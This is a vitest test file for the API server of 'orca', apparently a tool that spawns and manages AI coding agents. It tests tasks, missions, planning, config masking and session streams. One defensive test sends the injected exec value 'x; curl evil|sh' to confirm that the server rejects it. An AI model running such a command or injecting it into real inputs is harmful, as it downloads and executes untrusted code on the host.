import { describe, it, expect } from 'vitest';
import { openDb } from '../../src/store/db.js';
import { TaskStore } from '../../src/store/taskStore.js';
import { Readiness } from '../../src/store/readiness.js';
import { MissionStore } from '../../src/store/missionStore.js';
import { EventBus } from '../../src/api/sse.js';
import type { OrcaEvent } from '../../src/api/sse.js';
import { createServer } from '../../src/api/server.js';
import { FakeTmuxDriver } from '../../src/tmux/fakeDriver.js';
import { AgentStore } from '../../src/store/agentStore.js';
import { SpawnService } from '../../src/spawn/spawn.js';
import { MissionEngine } from '../../src/overseer/missionEngine.js';
import { FakeClock } from '../../src/shared/clock.js';
import { ConfigStore } from '../../src/store/configStore.js';
import { ProjectStore } from '../../src/store/projectStore.js';
import { FakeInference } from '../../src/inference/client.js';

function makeApp() {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const bus = new EventBus();
  const a = createServer({ tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus, engine: null as any, spawn: null as any, tmux: null as any, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db) });
  return { app: a, bus };
}

describe('api', () => {
  it('GET /health returns ok', async () => {
    const { app } = makeApp();
    const res = await app.request('/health');
    expect(res.status).toBe(200);
    expect(await res.json()).toEqual({ ok: true });
  });
  it('GET /health includes CORS header', async () => {
    const { app } = makeApp();
    const res = await app.request('/health', { headers: { origin: 'http://localhost:3000' } });
    expect(res.headers.get('access-control-allow-origin')).toBeTruthy();
  });
  it('POST /tasks creates and GET /tasks lists it', async () => {
    const { app } = makeApp();
    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-1', project_id: 1, title: 'X' }) });
    const list = await (await app.request('/tasks')).json();
    expect(list.map((t: { id: string }) => t.id)).toEqual(['orca-1']);
  });
  it('POST /tasks publishes a task SSE event', async () => {
    const { app, bus } = makeApp();
    const events: OrcaEvent[] = [];
    bus.subscribe(e => events.push(e));
    await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-2', project_id: 1, title: 'Y' }) });
    expect(events).toHaveLength(1);
    expect(events[0]).toMatchObject({ type: 'task', taskId: 'orca-2', status: 'open' });
  });
});

it('POST /tasks with body {title} generates an id and sets status open', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'From UI' }) });
  expect(res.status).toBe(201);
  const created = await res.json() as { id: string; title: string; status: string };
  expect(created.title).toBe('From UI');
  expect(created.status).toBe('open');
  expect(created.id).toBeTruthy();
  const list = await (await app.request('/tasks')).json() as Array<{ title: string }>;
  expect(list.some(t => t.title === 'From UI')).toBe(true);
});

it('POST /sessions with invalid exec returns 400 and spawns nothing', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'x; curl evil|sh' }) });
  expect(res.status).toBe(400);
  expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
  expect(await tmux.list()).toHaveLength(0);
});

it('POST /sessions launches an agent on a task and marks it in_progress', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'deepseek/deepseek-v4-flash' }) });
  expect(res.status).toBe(201);
  const body = await res.json();
  expect(body.session).toMatch(/^orca-/);
  expect(tasks.get('orca-1')?.status).toBe('in_progress');
  expect(await tmux.list()).toContain(body.session);
  // spawn tags the task with exec + agent labels so the UI can show its model and link the session
  const t1 = tasks.get('orca-1')!;
  expect(t1.labels).toContain('exec:deepseek/deepseek-v4-flash');
  expect(t1.labels.some((l) => l.startsWith('agent:'))).toBe(true);
});

it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const missions = new MissionStore(db);
  missions.create({ id: 'm1', epic_id: 'e1', autonomy: 'L3', max_sessions: 1, cleared_guardrails: [] });
  const tmux = new FakeTmuxDriver();
  // pause is delegated to the engine (it stops running agents, then marks the mission paused).
  const engine = { tick: async () => {}, pause: async (id: string) => missions.setState(id, 'paused') } as unknown as MissionEngine;
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions, bus: new EventBus(),
    engine, spawn: null as any, tmux, project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  await app.request('/missions/m1', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'pause' }) });
  expect((await (await app.request('/missions')).json())).toEqual([]); // paused → not active
  expect(missions.get('m1')?.state).toBe('paused');
  await app.request('/missions/m1', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'resume' }) });
  expect(missions.get('m1')?.state).toBe('active');
});

it('POST /sessions rejects an exec disallowed by config', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
  const config = new ConfigStore(db); config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
  const tmux = new FakeTmuxDriver();
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'codex:gpt-5.4' }) });
  expect(res.status).toBe(400);
  expect(await tmux.list()).toEqual([]);
});

it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tmux = new FakeTmuxDriver(); // no pane set for 'orca-dead' → returns ''
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const ctrl = new AbortController();
  const res = await app.request('/sessions/orca-dead/stream', { signal: ctrl.signal });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read();
  const text = new TextDecoder().decode(value);
  expect(text).toContain('event: pane');
  // empty pane: data contains {"pane":""}, stream must not throw
  expect(text).toContain('"pane"');
  ctrl.abort(); await reader.cancel();
});

it('GET /sessions/:name/stream emits a first pane frame', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tmux = new FakeTmuxDriver(); tmux.setPane('orca-A', 'hello-pane');
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux, project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const ctrl = new AbortController();
  const res = await app.request('/sessions/orca-A/stream', { signal: ctrl.signal });
  expect(res.status).toBe(200);
  expect(res.headers.get('content-type')).toContain('text/event-stream');
  const reader = res.body!.getReader();
  const { value } = await reader.read();
  const text = new TextDecoder().decode(value);
  expect(text).toContain('event: pane');
  expect(text).toContain('hello-pane');
  ctrl.abort(); await reader.cancel();
});

it('GET /missions/:id returns 404 for unknown mission', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/missions/unknown');
  expect(res.status).toBe(404);
});

it('GET /missions/:id returns mission detail for a seeded mission', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const missions = new MissionStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions, bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  tasks.create({ id: 'epic', project_id: 1, title: 'E', type: 'epic' });
  missions.create({ id: 'm1', epic_id: 'epic', autonomy: 'low', max_sessions: 1, cleared_guardrails: [] });
  const res = await app.request('/missions/m1');
  expect(res.status).toBe(200);
  const body = await res.json() as { epic: { id: string }; progress: { total: number } };
  expect(body.epic.id).toBe('epic');
  expect(body.progress.total).toBe(0);
});

it('GET /config returns masked config; PUT updates without exposing the key', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const config = new ConfigStore(db);
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: new FakeTmuxDriver(), project: { id: 1, path: '/o' },
    fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  const put = await app.request('/config', { method: 'PUT', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ allowedExecs: ['sonnet'], autopilot: { apiKey: 'sk-secret' } }) });
  expect(put.status).toBe(200);
  const get = await (await app.request('/config')).json();
  expect(get.allowedExecs).toEqual(['sonnet']);
  expect(get.autopilot.apiKeySet).toBe(true);
  expect(JSON.stringify(get)).not.toContain('sk-secret');
});

it('without a UserStore, routes are open (legacy mode)', async () => {
  const { app } = makeApp();
  expect((await app.request('/tasks')).status).toBe(200);
});

it('GET /activity returns [] without an EventStore (legacy)', async () => {
  const { app } = makeApp();
  expect(await (await app.request('/activity')).json()).toEqual([]);
});

it('PATCH /tasks/:id sets the exec label', async () => {
  const { app } = makeApp();
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-e', project_id: 1, title: 'E' }) });
  const res = await app.request('/tasks/orca-e', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ exec: 'sonnet' }) });
  expect(res.status).toBe(200);
  expect((await res.json()).labels).toContain('exec:sonnet');
});

it('PATCH /tasks/:id updates title, type and priority', async () => {
  const { app } = makeApp();
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-u', project_id: 1, title: 'Old' }) });
  const res = await app.request('/tasks/orca-u', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'New', type: 'bug', priority: 'P0' }) });
  expect(res.status).toBe(200);
  const t = await res.json();
  expect(t.title).toBe('New'); expect(t.type).toBe('bug'); expect(t.priority).toBe('P0');
});

it('POST /tasks sets dependencies and GET /tasks/:id/deps returns them; PATCH replaces them', async () => {
  const { app } = makeApp();
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'dep-a', project_id: 1, title: 'A' }) });
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'dep-b', project_id: 1, title: 'B' }) });
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'dep-c', project_id: 1, title: 'C', deps: ['dep-a', 'dep-b'] }) });
  const deps = await (await app.request('/tasks/dep-c/deps')).json();
  expect(deps.sort()).toEqual(['dep-a', 'dep-b']);
  await app.request('/tasks/dep-c', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ deps: ['dep-a'] }) });
  expect(await (await app.request('/tasks/dep-c/deps')).json()).toEqual(['dep-a']);
  const all = await (await app.request('/tasks/deps')).json() as { task_id: string; depends_on_id: string }[];
  expect(all).toContainEqual({ task_id: 'dep-c', depends_on_id: 'dep-a' });
});

it('POST /tasks persists a description and PATCH updates it', async () => {
  const { app } = makeApp();
  const post = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'X', description: 'do the thing' }) });
  const created = await post.json() as { id: string; description: string };
  expect(created.description).toBe('do the thing');
  const patch = await app.request(`/tasks/${created.id}`, { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ description: 'changed' }) });
  expect((await patch.json()).description).toBe('changed');
});

it('DELETE /tasks/:id removes the task and publishes a cancelled event', async () => {
  const { app, bus } = makeApp();
  const events: OrcaEvent[] = []; bus.subscribe(e => events.push(e));
  await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ id: 'orca-d', project_id: 1, title: 'Doomed' }) });
  const res = await app.request('/tasks/orca-d', { method: 'DELETE' });
  expect(res.status).toBe(200);
  const list = await (await app.request('/tasks')).json() as Array<{ id: string }>;
  expect(list.some(t => t.id === 'orca-d')).toBe(false);
  expect(events.some(e => e.type === 'task' && e.taskId === 'orca-d' && e.status === 'cancelled')).toBe(true);
});

it('POST /tasks honours an explicit project_id (multi-project)', async () => {
  const db = openDb(':memory:');
  db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  db.prepare("INSERT INTO projects (id,slug,path) VALUES (2,'other','/p2')").run();
  const tasks = new TaskStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
    config: new ConfigStore(db), projects: new ProjectStore(db),
  });
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'X', project_id: 2 }) });
  expect(res.status).toBe(201);
  const created = await res.json() as { id: string; project_id: number };
  expect(created.project_id).toBe(2);
  expect(created.id.startsWith('p2-')).toBe(true); // id prefix derives from project 2's path basename
});

it('POST /tasks rejects an unknown project_id with 404', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0),
    config: new ConfigStore(db), projects: new ProjectStore(db),
  });
  const res = await app.request('/tasks', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ title: 'X', project_id: 99 }) });
  expect(res.status).toBe(404);
});

it('POST /tasks/plan without an autopilot key returns 400', async () => {
  const { app } = makeApp(); // no apiKey configured
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'do stuff' }) });
  expect(res.status).toBe(400);
  expect(await res.json()).toMatchObject({ error: 'autopilot_key_missing' });
});

it('POST /tasks/plan decomposes a goal into an epic with sequential phase subtasks', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"Schema","type":"task"},{"title":"API","type":"feature"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'build app' }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { epic: { id: string; type: string; title: string }; phases: { id: string; title: string; parent_id: string }[] };
  expect(body.epic.type).toBe('epic');
  expect(body.epic.title).toBe('build app');
  expect(body.phases.map(p => p.title)).toEqual(['Schema', 'API']);
  expect(body.phases.every(p => p.parent_id === body.epic.id)).toBe(true);
  // phase 2 depends on phase 1
  expect(tasks.depsAmong(body.phases.map(p => p.id))).toEqual([{ task_id: body.phases[1].id, depends_on_id: body.phases[0].id }]);
});

it('POST /tasks/plan stores the model-assigned agent name as a label', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"Schema","type":"task","agent":"Nova"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'build app' }) });
  const body = await res.json() as { phases: { labels: string[] }[] };
  expect(body.phases[0].labels).toContain('agent:Nova');
});

it('POST /tasks/plan with supplied phases skips the LLM and needs no key', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
    makeInference: () => { throw new Error('LLM must not be called in manual mode'); },
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'manual goal', phases: [{ title: 'One', type: 'feature' }, { title: 'Two' }] }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { epic: { title: string }; phases: { title: string; type: string }[] };
  expect(body.epic.title).toBe('manual goal');
  expect(body.phases.map(p => [p.title, p.type])).toEqual([['One', 'feature'], ['Two', 'task']]);
});

it('POST /tasks/plan dryRun returns phases without creating any tasks', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"A","type":"task"},{"title":"B"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'preview me', dryRun: true, prompt: 'custom {{goal}}' }) });
  expect(res.status).toBe(200);
  expect((await res.json() as { phases: { title: string }[] }).phases.map(p => p.title)).toEqual(['A', 'B']);
  expect(await (await app.request('/tasks')).json()).toEqual([]); // nothing persisted
});

it('POST /tasks/plan with engage=true engages a mission on the epic', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db);
  const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  let engagedEpic = '';
  const engine = { engage: async (input: { epicId: string }) => { engagedEpic = input.epicId; return { id: 'm-x', epic_id: input.epicId, autonomy: 'L3', max_sessions: 1, state: 'active' }; } } as unknown as MissionEngine;
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"Only phase"}]'),
  });
  const res = await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'ship it', engage: true }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { epic: { id: string }; mission: { id: string } };
  expect(body.mission.id).toBe('m-x');
  expect(engagedEpic).toBe(body.epic.id);
});

it('POST /tasks/:epicId/phases inserts a phase chained after the epic\'s current tail', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db);
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  // Build an epic with two sequential phases (manual mode — no key needed).
  const plan = await (await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'epic', phases: [{ title: 'One' }, { title: 'Two' }] }) })).json() as { epic: { id: string }; phases: { id: string }[] };
  const tail = plan.phases[1].id;
  // Insert a third phase.
  const res = await app.request(`/tasks/${plan.epic.id}/phases`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ phases: [{ title: 'Three', type: 'feature' }] }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { phases: { id: string; title: string; type: string; parent_id: string }[] };
  expect(body.phases.map(p => [p.title, p.type])).toEqual([['Three', 'feature']]);
  expect(body.phases[0].parent_id).toBe(plan.epic.id);
  // The new phase waits on the previous tail (phase Two).
  expect(tasks.depsFor(body.phases[0].id)).toEqual([tail]);
});

it('POST /tasks/:epicId/phases replans a residual goal into chained phases', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db); config.update({ autopilot: { apiKey: 'k' } });
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
    makeInference: () => new FakeInference('[{"title":"R1"},{"title":"R2"}]'),
  });
  const plan = await (await app.request('/tasks/plan', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'epic', phases: [{ title: 'One' }] }) })).json() as { epic: { id: string }; phases: { id: string }[] };
  const res = await app.request(`/tasks/${plan.epic.id}/phases`, { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ goal: 'do more' }) });
  expect(res.status).toBe(201);
  const body = await res.json() as { phases: { id: string; title: string }[] };
  expect(body.phases.map(p => p.title)).toEqual(['R1', 'R2']);
  expect(tasks.depsFor(body.phases[0].id)).toEqual([plan.phases[0].id]); // R1 after the existing phase
  expect(tasks.depsFor(body.phases[1].id)).toEqual([body.phases[0].id]); // R2 after R1
});

it('POST /tasks/:epicId/phases returns 404 for a non-epic id', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const app = createServer({
    tasks: new TaskStore(db), readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine: null as any, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config: new ConfigStore(db),
  });
  const res = await app.request('/tasks/nope/phases', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ phases: [{ title: 'X' }] }) });
  expect(res.status).toBe(404);
});

it('POST /tasks/:epicId/phases ticks an active mission so it picks up the new phase', async () => {
  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
  const tasks = new TaskStore(db); const config = new ConfigStore(db);
  let ticked = '';
  const engine = { isActive: (id: string) => id === 'm-E', tick: async (id: string) => { ticked = id; } } as unknown as MissionEngine;
  const app = createServer({
    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
    engine, spawn: null as any, tmux: null as any,
    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
  });
  tasks.create({ id: 'E', project_id: 1, title: 'Epic', type: 'epic', description: 'goal' });
  const res = await app.request('/tasks/E/phases', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ phases: [{ title: 'New' }] }) });
  expect(res.status).toBe(201);
  expect(ticked).toBe('m-E');
});
